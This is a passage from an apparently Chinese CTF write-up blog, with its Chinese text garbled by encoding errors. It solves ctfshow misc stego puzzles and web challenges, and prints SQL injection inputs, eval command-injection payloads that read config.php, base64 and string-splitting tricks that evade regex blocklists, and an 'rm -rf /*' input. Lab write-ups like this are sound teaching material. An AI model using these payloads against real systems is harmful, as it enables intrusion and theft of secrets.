<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Author: dota_st</span></span><br><span class="line"><span class="string">Date: 2021-01-25 14:47:26</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = <span class="string">&quot;i was always Fond of visiting new scenes, and observing strange characters and manners. even when a mere chiLd i began my travels, and made mAny tours of discovery into foreiGn &#123;parts and unknown regions of my native City, to the frequent alarm of my parents, and The emolument of the town-crier. as i grew into boyhood, i extended the range oF my obServations. my holiday afternoons were spent in rambles about tHe surrounding cOuntry. i made myself familiar With all its places famous in history or fable. i kNew every spot where a murder or robbery had been committed, or a ghost seen. i visited the neighboring villages, and added greatly to my stock of knowledge,By noting their habits and customs, and conversing with their sages and great men.&#125;&quot;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span>((ord(i)&gt;=<span class="number">65</span> <span class="keyword">and</span> ord(i)&lt;=<span class="number">90</span>) <span class="keyword">or</span> (ord(i)==<span class="number">123</span> <span class="keyword">or</span> ord(i)==<span class="number">125</span>)):</span><br><span class="line">        result = result+i</span><br><span class="line">        print(result)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B95/0C~%7B9LK%280DUX%60WM%40ARE2S9J.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FLAG&#123;CTFSHOWNB&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ‚é¡¹6"><a class="header-anchor" href="#æ‚é¡¹6">Â¶</a>æ‚é¡¹6</h3>
<p>å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé¢˜ç›®çš„æ„æ€é€éœ²æ˜¯ä¼ªåŠ å¯†ï¼Œå½“ç„¶æœ‰äº›å‹ç¼©è½¯ä»¶æ˜¯æ— è§†ä¼ªåŠ å¯†ï¼Œç›´æ¥å°±èƒ½æ‰“å¼€ï¼Œè¿™é‡Œæˆ‘ç›´æ¥å°±æ‰“å¼€çœ‹åˆ°äº†flagï¼Œä¸è¿‡è¿˜æ˜¯è¯´è¯´é¢„æœŸçš„åšæ³•ã€‚é¦–å…ˆç”¨010æ‰“å¼€å‹ç¼©åŒ…ï¼Œç„¶åæŠŠè¿™é‡Œçš„09æ”¹æˆ00å†ä¿å­˜ï¼Œå³å¯å»é™¤ä¼ªåŠ å¯†<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B96/NIN%5DT%7BE8B_T4ZQX%7DBCIH5KI.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;c_t_f_s_h_o_w&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ‚é¡¹7"><a class="header-anchor" href="#æ‚é¡¹7">Â¶</a>æ‚é¡¹7</h3>
<p>ä¸‹è½½ä¸‹æ¥å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œæ‰“å¼€æ˜¯ä¸€ä¸ªè‰²å›¾ï¼ˆå‡ºé¢˜äººæ˜¯ä¸ªlspï¼‰ï¼Œæ ¹æ®æç¤ºä¿®æ”¹é«˜åº¦ï¼Œæ”¾è¿›010ä¸­ä¿®æ”¹é«˜åº¦<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B97/~8CSB%5D%24%288%24BYJ6L%408L7V7~D.png" alt=""><br>
pngæ ¼å¼çš„è¯ï¼Œä»ç¬¬äºŒè¡Œå¼€å§‹ï¼Œå‰å››ä¸ªå­—èŠ‚ä»£è¡¨å®½åº¦ï¼Œåå››ä¸ªä»£è¡¨é«˜åº¦ï¼Œä¿®æ”¹å®Œä¿å­˜å†æ‰“å¼€å°±å¯ä»¥çœ‹åˆ°flagäº†<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B97/YV0%5BHB%5B0YEH%7D29FJP6Z8MSX.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;beautiful&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ‚é¡¹8"><a class="header-anchor" href="#æ‚é¡¹8">Â¶</a>æ‚é¡¹8</h3>
<p>ä¸‹è½½å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹åå¾—åˆ°ä¸€å¼ pngå›¾ç‰‡<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B98/IVQ785%24IV1%7BDGYI_S2~%5BORN.png" alt=""><br>
å¾ˆæ˜æ˜¾å®½åº¦è¢«ä¿®æ”¹è¿‡å¯¼è‡´å›¾ç‰‡æŸåï¼Œæ‰€ä»¥æˆ‘ä»¬å»æ‰¾æ‰¾å›¾ç‰‡ä¸­çš„crc<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B98/%7DGH4%40STNGDV%5BK%40L%5B70JV%40%606.png" alt=""><br>
crcä¸ºï¼š91918666ï¼Œæ‰€ä»¥é€šè¿‡è„šæœ¬è¿›è¡Œçˆ†ç ´å›¾ç‰‡åŸæœ¬çš„å®½åº¦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Author: dota_st</span></span><br><span class="line"><span class="string">Date: 2021-01-25 18:40:40</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;flag.png&#x27;</span></span><br><span class="line"><span class="keyword">with</span> open(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    all_b = f.read()</span><br><span class="line">    data = bytearray(all_b[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">    n = <span class="number">4095</span></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> range(n):</span><br><span class="line">        width = bytearray(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))</span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> range(n):</span><br><span class="line">            height = bytearray(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">                data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            crc32result = zlib.crc32(data)</span><br><span class="line">            <span class="keyword">if</span> crc32result == <span class="number">0x91918666</span>:</span><br><span class="line">                print(<span class="string">&quot;å®½ä¸ºï¼š&quot;</span>, width, int.from_bytes(width, byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">                print(<span class="string">&quot;é«˜ä¸ºï¼š&quot;</span>, height, int.from_bytes(height, byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œåå¾—åˆ°<code>å®½ä¸ºï¼š bytearray(b'\x00\x00\x02\x0c') 524</code>ï¼Œæ‰€ä»¥åœ¨010ä¸­ä¿®æ”¹03æˆ02ä¿å­˜å³å¯å¾—åˆ°æ­£å¸¸å›¾ç‰‡ï¼Œæ‹¿åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B98/flag.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;you_are_very_well&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ‚é¡¹9"><a class="header-anchor" href="#æ‚é¡¹9">Â¶</a>æ‚é¡¹9</h3>
<p>è¿™é“é¢˜å¤§æ¦‚å°±æ˜¯ä¿®æ”¹game.dllè¾¾åˆ°é­”å…½äº‰éœ¸èƒ½å¼€å…¨å›¾è§†é‡ï¼Œç„¶åæäº¤ä¿®æ”¹çš„é‚£ä¸ªåŸºå€å°±å¯ä»¥ã€‚è¿™é“é¢˜ä¸å†™ï¼Œçœ‹æˆ‘idåº”è¯¥èƒ½è”æƒ³åˆ°æ›¾ç»æˆ‘ä¹Ÿæ˜¯dotaç©å®¶çš„ä¸€å‘˜ï¼Œå¯æƒœå¦‚ä»Šå·²è¢«å¼€å›¾å¼„å¾—æ»¡ç›®è‹å¤·ğŸ˜­</p>
<h3 id="æ‚é¡¹10"><a class="header-anchor" href="#æ‚é¡¹10">Â¶</a>æ‚é¡¹10</h3>
<p>æŠŠå›¾ç‰‡ç¼©å°å°±èƒ½çœ‹åˆ°æ˜¯â€œæˆ‘å¥½å–œæ¬¢ä½ â€<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B910/FT4%24%24NTE8I%29L9EC_9XO%25TPH.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;æˆ‘å¥½å–œæ¬¢ä½ &#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ‚é¡¹11"><a class="header-anchor" href="#æ‚é¡¹11">Â¶</a>æ‚é¡¹11</h3>
<p>ä¸‹è½½ä¸‹æ¥å¾—åˆ°ä¸€ä¸ªå›¾ç‰‡ï¼Œæ˜¯jphséšå†™ï¼Œç”¨å·¥å…·è§£å¯†ï¼Œå¯†ç ä¸ºç©ºï¼Œä¿å­˜ä¸º6.txt<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B911/UR5Y~%24GA52EE%60U%244%7DIOC7%7BU.png" alt=""><br>
æ‰“å¼€6.txtï¼Œå‘ç°pngå¤´<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B911/0FWLI%24%7BG%5BF%28%7B%5BD~%60B%25OAE8E.png" alt=""><br>
ä¿®æ”¹6.txtæˆ6.pngï¼Œå¾—åˆ°ä¸€å¼ äºŒç»´ç <br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B911/6.png" alt=""><br>
æ‰«æä¸€ä¸‹äºŒç»´ç <br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B911/8RRFSFO1UUU7%29PMH~MBNQ7W.png" alt=""><br>
æŠŠåé¢è¿™ä¸²base64æ‹¿å»è§£å¯†ï¼Œå¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B911/%60K%60%40PZXGIZ%29W%7DRWT%24B1KO7K.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;æˆ˜ç¥å½’æ¥å‘ç°è‡ªå·±å„¿å­åœ¨åˆ·é¢˜ï¼Œä¸€æ€’ä¹‹ä¸‹å¬å”¤10ä¸‡å°†å£«æ¥æŠ¥ä»‡&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Web"><a class="header-anchor" href="#Web">Â¶</a>Web</h2>
<h3 id="web1"><a class="header-anchor" href="#web1">Â¶</a>web1</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.showèŒæ–°è®¡åˆ’web1&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"># åŒ…å«æ•°æ®åº“è¿æ¥æ–‡ä»¶</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"># åˆ¤æ–­getæäº¤çš„å‚æ•°idæ˜¯å¦å­˜åœ¨</span><br><span class="line">if(isset($_GET[&#39;id&#39;]))&#123;</span><br><span class="line">    $id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">    # åˆ¤æ–­idçš„å€¼æ˜¯å¦å¤§äº999</span><br><span class="line">    if(intval($id) &gt; 999)&#123;</span><br><span class="line">        # id å¤§äº 999 ç›´æ¥é€€å‡ºå¹¶è¿”å›é”™è¯¯</span><br><span class="line">        die(&quot;id error&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        # id å°äº 999 æ‹¼æ¥sqlè¯­å¥</span><br><span class="line">        $sql &#x3D; &quot;select * from article where id &#x3D; $id order by id limit 1 &quot;;</span><br><span class="line">        echo &quot;æ‰§è¡Œçš„sqlä¸ºï¼š$sql&lt;br&gt;&quot;;</span><br><span class="line">        # æ‰§è¡Œsql è¯­å¥</span><br><span class="line">        $result &#x3D; $conn-&gt;query($sql);</span><br><span class="line">        # åˆ¤æ–­æœ‰æ²¡æœ‰æŸ¥è¯¢ç»“æœ</span><br><span class="line">        if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            # å¦‚æœæœ‰ç»“æœï¼Œè·å–ç»“æœå¯¹è±¡çš„å€¼$row</span><br><span class="line">            while($row &#x3D; $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        # å…³é—­æ•°æ®åº“è¿æ¥</span><br><span class="line">        $conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;!-- flag in id &#x3D; 1000 --&gt;</span><br><span class="line">&lt;&#x2F;html&gt; </span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæ³¨æ„åˆ°æœ‰ä¸¤ä¸ªæ¡ä»¶ï¼Œç¬¬ä¸€ä¸ªå¦‚æœä¼ å…¥çš„idå¤§äº999åˆ™æŠ¥é”™ï¼Œè€Œæ³¨é‡Šæç¤ºæˆ‘ä»¬idç­‰äº1000çš„æ—¶å€™å¯ä»¥æŸ¥è¯¢å‡ºflagã€‚è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°æ‹¬å·é‡Œçš„åˆ¤æ–­æ˜¯ç”¨çš„intvalå‡½æ•°</p>
<blockquote>
<p>intvalå‡½æ•°ç‰¹æ€§ï¼š<br>
intvalå‡½æ•°æ˜¯è·å–å˜é‡çš„æ•´å‹å€¼ï¼Œå½“å®ƒè·å–çš„å˜é‡ä¸èƒ½è¢«è½¬æ¢æ—¶è¿”å›0ï¼›<br>
å¦‚æœå­—ç¬¦ä¸²å…¶ä¸­æœ‰æ•°å­—ï¼Œåˆ™è¿”å›æ•°å­—ï¼›<br>
å¦‚æœå¼€å¤´æ— æ³•è¢«è½¬æ¢ï¼Œåˆ™è¿”å›0ï¼›</p>
</blockquote>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨å­—ç¬¦ä¸²çš„å½¢å¼ï¼Œå¦‚â€™1000â€™è¿›è¡Œç»•è¿‡<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web1/%60LZ29%5DJZ3L%29D%24%28%7B%292%60NIDJD.png" alt=""><br>
ä¹Ÿå¯ä»¥æ¢æˆ<br>
äºŒè¿›åˆ¶ï¼š0b1111101000<br>
16è¿›åˆ¶ï¼š0x3e8<br>
åŒé‡å–åï¼š~~1000<br>
æˆ–è€…100*10<br>
è¿™é‡Œä¹Ÿå­˜åœ¨sqlæ³¨å…¥<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web1/~SZMD3FOJY19SPW0P%605OUNW.png" alt=""><br>
å½“ç„¶çœäº‹çš„è¯ç›´æ¥æŒ‰ç…§ä»–sqlè¯­å¥è¿›è¡Œï¼Œå–<code>?id=id--+</code>ç›´æ¥æ˜¾ç¤ºå…¨éƒ¨</p>
<h3 id="web2"><a class="header-anchor" href="#web2">Â¶</a>web2</h3>
<p>æ¥ç€ä¸Šé“é¢˜ï¼Œè¿™é‡Œé¢˜ç›®è¯´ç®¡ç†å‘˜ä¿®æ”¹äº†ä¸€ä¸‹ä»£ç ï¼Œä½†è¿˜æ˜¯èƒ½æŒ‰ç…§ä¸Šé¢˜æ€è·¯è§£å‡º<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web2/J0%60%7BU%60N4P9_9D%25VKCR%299_KL.png" alt=""></p>
<h3 id="web3"><a class="header-anchor" href="#web3">Â¶</a>web3</h3>
<p>è¿™æ¬¡å¤šåŠ äº†è¿‡æ»¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+/i&quot;</span>,$id))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
<p>ä½†æˆ‘ä»¬ä¾ç„¶å¯ä»¥åˆ©ç”¨intvalå‡½æ•°ç‰¹æ€§è¿›è¡Œç»•è¿‡<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web3/ND%60OP54_%28EFK97T%5B451%297ZS.png" alt=""></p>
<h3 id="web4"><a class="header-anchor" href="#web4">Â¶</a>web4</h3>
<p>è¿™æ¬¡å†é¢åŸºç¡€ä¸Šåˆå¤šåŠ äº†selectè¯­å¥è¿‡æ»¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/or|\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;</span>,$id))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
<p>ä½†intvalå‡½æ•°ä¾ç„¶å­˜åœ¨ï¼Œæˆ‘ä»¬ç»§ç»­æ„é€ ?id='1000â€™è·å–flag</p>
<h3 id="web5"><a class="header-anchor" href="#web5">Â¶</a>web5</h3>
<p>è¿™æ¬¡ä¸èƒ½å†ä½¿ç”¨â€™1000â€˜è·å–flagäº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;</span>,$id))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™æ¬¡æ­£åˆ™è¡¨è¾¾å¼ä¸­åŒ¹é…äº†å•å¼•å·å’ŒåŒå¼•å·ï¼Œå†ä½¿ç”¨<code>?id='1000'</code>ï¼Œå•å¼•å·å°±ä¼šè¢«åŒ¹é…åˆ°ï¼Œå›æ˜¾id error<br>
ä½†~æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡‡å–åŒé‡å–åè¿›è¡Œç»•è¿‡ï¼Œå³æ„é€ <code>?id=~~1000</code>ï¼Œå°±å¯è·å–åˆ°flag</p>
<h3 id="web6"><a class="header-anchor" href="#web6">Â¶</a>web6</h3>
<p>ä¾ç„¶å¢åŠ äº†æ­£åˆ™è¡¨è¾¾å¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        $id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|x|hex|\(|\)|\+|select/i&quot;</span>,$id))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡çœ‹åˆ°å¤šåŒ¹é…äº†ä¸€ä¸ª<sup>ï¼Œä½†æˆ‘ä»¬ä¸ç”¨</sup>ï¼Œæˆ‘ä»¬ç»§ç»­ä½¿ç”¨åŒé‡å–åæ„é€ è·å–flagï¼š<code>?id=~~1000</code></p>
<h3 id="web7"><a class="header-anchor" href="#web7">Â¶</a>web7</h3>
<p>ohï¼Œno!</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;</span>,$id))&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">   &#125; </span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡å®ƒç»ˆäºæŠŠ<code>~</code>åŠ åˆ°æ­£åˆ™è¡¨è¾¾å¼äº†ï¼Œæˆ‘ä»¬æ— æ³•ä½¿ç”¨åŒé‡å–åçš„å¥—è·¯äº†<br>
è¿™æ¬¡æˆ‘ä»¬ä½¿ç”¨sqlæ³¨å…¥ï¼Œé‡‡å–<code>?id=id%23</code>è¿›è¡Œæ³¨å…¥ï¼Œè·å–flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web7/D%60QTGOVBB_WRP_%28MEYRI%40%60U.png" alt=""></p>
<h3 id="web8"><a class="header-anchor" href="#web8">Â¶</a>web8</h3>
<p>emmmï¼Œè¿™é“é¢˜ä¸€å¼€å§‹æˆ‘è¿˜ä»¥ä¸ºæ˜¯md5å…¨ç›¸ç­‰ï¼Œåé¢é—®äº†æ‰çŸ¥é“è¿™æ˜¯ä¸ªç©æ¢—çš„é¢˜ï¼Œå³ç¨‹åºå‘˜ç¦»èŒåˆ åº“è·‘è·¯ï¼Œå‘½ä»¤<code>rm -rf /*</code>ï¼ŒLinuxä¸‹å¼ºåˆ¶é€’å½’åˆ é™¤æ–‡ä»¶ã€‚<br>
æ‰€ä»¥æ„é€ æˆ?flag=rm -rf /*<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web8/4QL%290H49VUPBABI8LD180%29S.png" alt=""></p>
<h3 id="web9"><a class="header-anchor" href="#web9">Â¶</a>web9</h3>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web9/_YDF%29_0HEIUECJ%5DF%247T4%7BAW.png" alt=""><br>
è€ƒæŸ¥evalå‘½ä»¤æ‰§è¡Œï¼Œå¹¶ä¸”éœ€è¦åŒ¹é…åˆ°<strong>system|exec|highlight</strong>ä¸‰ä¸ªå…¶ä¸­ä¹‹ä¸€<br>
è¿™é‡Œä½¿ç”¨systemå‘½ä»¤é…åˆtacè¯»å–config.phpæ–‡ä»¶<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web9/Y8NXJHEEAK%60SW%7DQW%60M7~%5DYM.png" alt=""><br>
è¿™é‡Œä¸ºå•¥ä¸ç”¨catå‘½ä»¤è¯»å–ï¼Ÿå› ä¸ºcatè¯»å–è¿˜éœ€è¦å³é”®æŸ¥çœ‹æºç æ‰èƒ½çœ‹åˆ°flagï¼ŒQWQ<br>
è¿˜å¯ä»¥ä½¿ç”¨highlightï¼Œæ„é€ æˆ<strong>?c=highlight_file(â€œconfig.phpâ€);</strong><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web9/WL%7D1TDTU%5DP%7D4Y%24202RZGM6T.png" alt=""><br>
è¿˜å¯ä»¥ä½¿ç”¨execå‘½ä»¤ï¼Œæ„é€ æˆ<strong>?c=exec(â€˜tac config.phpâ€™,$res);var_dump($res);</strong><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web9/_3BDIKSEX%28%5DA%25QMRU~%29MT%28V.png" alt=""></p>
<h3 id="web10"><a class="header-anchor" href="#web10">Â¶</a>web10</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡æ˜¯æ­£åˆ™åŒ¹é…ä¸å…è®¸ä½¿ç”¨ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°±ä¸èƒ½ç›´æ¥ä½¿ç”¨è¿™ä¸‰ä¸ªå‘½ä»¤ï¼Œå¯ä»¥é‡‡å–å‘½ä»¤æ‹¼æ¥çš„æ–¹å¼æ„é€ </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$a&#x3D;&#39;sys&#39;;$b&#x3D;&#39;tem&#39;;$c&#x3D;$a.$b;$c(&#39;tac config.php&#39;);</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web10/B_%40%40%5BP_YWOJ7FWSY%5BE%296%29CH.png" alt=""><br>
æˆåŠŸè·å–åˆ°flag</p>
<h3 id="web11"><a class="header-anchor" href="#web11">Â¶</a>web11</h3>
<p>è¿™æ¬¡æ˜¯åœ¨å‰é¢åŸºç¡€ä¸Šæ­£åˆ™åŒ¹é…åˆ°cat</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä½†æˆ‘ç”¨çš„æ˜¯tacï¼Œæ‰€ä»¥ä¾ç„¶å¯ä»¥æŒ‰ç…§ä¸Šé¢˜çš„è§£æ³•æ„é€ ï¼Œè·å–flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$a&#x3D;&#39;sys&#39;;$b&#x3D;&#39;tem&#39;;$c&#x3D;$a.$b;$c(&#39;tac config.php&#39;);</span><br></pre></td></tr></table></figure>
<h3 id="web12"><a class="header-anchor" href="#web12">Â¶</a>web12</h3>
<p>è¿™æ¬¡å±…ç„¶è¿æ–‡ä»¶åä¹Ÿè¿‡æ»¤äº†å‘œå‘œå‘œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\.|php|config/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ³¢ä½ é€¼æˆ‘çš„ï¼Œæˆ‘ä»¬åˆ©ç”¨base64ç¼–ç è¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br>
æŠŠsystemç»è¿‡base64ç¼–ç åï¼šc3lzdGVt<br>
æŠŠtac config.phpç»è¿‡base64ç¼–ç åï¼šdGFjIGNvbmZpZy5waHA=<br>
æ‰€ä»¥æ„æˆæˆè¿™æ ·</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$a&#x3D;base64_decode(&quot;c3lzdGVt&quot;);$b&#x3D;base64_decode(&quot;dGFjIGNvbmZpZy5waHA&#x3D;&quot;);$a($b);</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web12/C8BK0DY49JDXZJSGCNB%25Z%5D3.png" alt=""><br>
æˆåŠŸè·å–åˆ°flag</p>
<h3 id="web13"><a class="header-anchor" href="#web13">Â¶</a>web13</h3>
